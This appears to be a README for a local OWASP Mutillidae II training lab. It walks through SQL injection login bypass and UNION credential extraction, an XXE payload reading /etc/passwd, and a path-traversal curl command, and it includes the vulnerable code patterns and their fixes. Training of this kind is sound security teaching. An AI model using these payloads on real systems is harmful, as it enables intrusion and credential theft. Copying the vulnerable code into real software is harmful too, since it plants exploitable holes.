# OWASP Mutillidae II: Comprehensive Web Application & ASVS Pentesting Target

## Overview

OWASP Mutillidae II is a deliberately vulnerable web application designed by Jeremy Druin (`webpwnized`) for web penetration testing training, secure code review, and automated scanner benchmarking. It implements scenarios mapped across the OWASP Top 10 (2013, 2017, 2021) and the OWASP Application Security Verification Standard (ASVS).

Unlike static targets, Mutillidae features a real-time **Security Level Switch** (Level 0: completely vulnerable, Level 1: client-side JavaScript validation only, Level 5: secure defense-in-depth). This allows students and penetration testers to observe the exact architectural contrast between insecure code, naive perimeter checks, and robust server-side sanitization.

- **Primary Interface**: `http://localhost:8116`
- **Docker Shortcut**: `./lab start mutillidae`
- **Container Name**: `cyberlab_02_mutillidae`
- **RAM Footprint**: ~400 MB

---

## Architecture & Technology Stack

```
+-------------------------------------------------------------+
|                     Client Browser / Burp Suite             |
+-------------------------------------------------------------+
                               |
                        HTTP Port 8116
                               v
+-------------------------------------------------------------+
|                  OWASP Mutillidae II Container              |
|                                                             |
|  [Apache 2.4 + PHP 7/8 Runtime]                            |
|    - Core Application Logic (/var/www/html)                 |
|    - Dynamic Security Engine (Levels 0, 1, 5)               |
|    - Embedded Video Tutorials & Exploit Hints               |
|    - SOAP & REST Web Service Endpoints                      |
|                                                             |
|  [Embedded MySQL / MariaDB Relational Database]             |
|    - Accounts, credit cards, blogs, and user logs           |
+-------------------------------------------------------------+
```

---

## First-Time Initialization

Upon the very first launch, Mutillidae requires its relational database tables to be populated:

1. Navigate to `http://localhost:8116` in your browser.
2. If an error banner displays indicating database connection issues, click the **"Setup / Reset Database"** link in the top menu (or navigate to `http://localhost:8116/set-up-database.php`).
3. Click the button to automatically execute the migration schema and populate test accounts.

---

## Key Vulnerability Domains & Attack Exercises

### 1. Advanced SQL Injection (Authentication Bypass & Data Extraction)

- **Target Page**: `http://localhost:8116/index.php?page=login.php`
- **Vulnerability Mechanism**: Unparameterized SQL query execution inside authentication logic:
  ```sql
  SELECT * FROM accounts WHERE username='$username' AND password='$password'
  ```
- **Attack Walkthrough**:
  1. Input in the username field:
     ```text
     admin' or '1'='1' --
     ```
  2. Input any password and submit. The SQL query evaluates to true, authenticating you as the first administrative record.
  3. Extract database schemas using UNION queries inside the User Info search (`page=user-info.php`):
     ```text
     ' UNION SELECT null, username, password, null, null FROM accounts --
     ```

### 2. XML External Entity (XXE) Injection

- **Target Page**: `http://localhost:8116/index.php?page=xml-validator.php`
- **Vulnerability Mechanism**: PHP `libxml` parser initialized without disabling external entity resolution (`LIBXML_NOENT` enabled).
- **Attack Walkthrough**:
  Send a crafted XML payload reading local system files:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <comment>
    <username>pentester</username>
    <text>&xxe;</text>
  </comment>
  ```
  The parsed output reflects the contents of `/etc/passwd`.

### 3. Server-Side Request Forgery (SSRF) & File Inclusion (LFI/RFI)

- **Target Page**: `http://localhost:8116/index.php?page=arbitrary-file-inclusion.php`
- **Vulnerability Mechanism**: Dynamic inclusion of files via unvalidated query parameters:
  ```php
  include($_GET['page']);
  ```
- **Attack Walkthrough**:
  Traverse parent directories to inspect configuration files:
  ```bash
  curl -s "http://localhost:8116/index.php?page=../../../../etc/hosts"
  ```

### 4. HTML5 Client-Side Storage Exploitation

- **Target Page**: `http://localhost:8116/index.php?page=html5-storage.php`
- **Vulnerability Mechanism**: Sensitive session tokens and transaction state persisted insecurely inside `window.localStorage` and `window.sessionStorage`, rendering them accessible to any Cross-Site Scripting (XSS) payload.

---

## Defensive Remediation & Hardening

1. **Prepared Statements with Parameterized Queries**:
   ```php
   $stmt = $pdo->prepare('SELECT id, username FROM accounts WHERE username = :user AND password = :pass');
   $stmt->execute(['user' => $username, 'pass' => $passwordHash]);
   ```
2. **Disable XML External Entity Resolution**:
   ```php
   libxml_disable_entity_loader(true);
   ```
3. **Whitelist Input for Dynamic Inclusions**:
   Never pass raw request parameters to `include()` or `require()`. Map allowable identifiers to a strict lookup table.

---

## Video Walkthroughs & Technical References

- [Mutillidae: Lab 1 Walkthrough](https://www.youtube.com/watch?v=zneRNme9h3U)
- [Mutillidae: Lab 5 Walkthrough](https://www.youtube.com/watch?v=lU_fu-B5QtI)
- [OWASP Mutillidae II GitHub Source](https://github.com/webpwnized/mutillidae)
- [OWASP ASVS Verification Framework](https://owasp.org/www-project-application-security-verification-standard/)
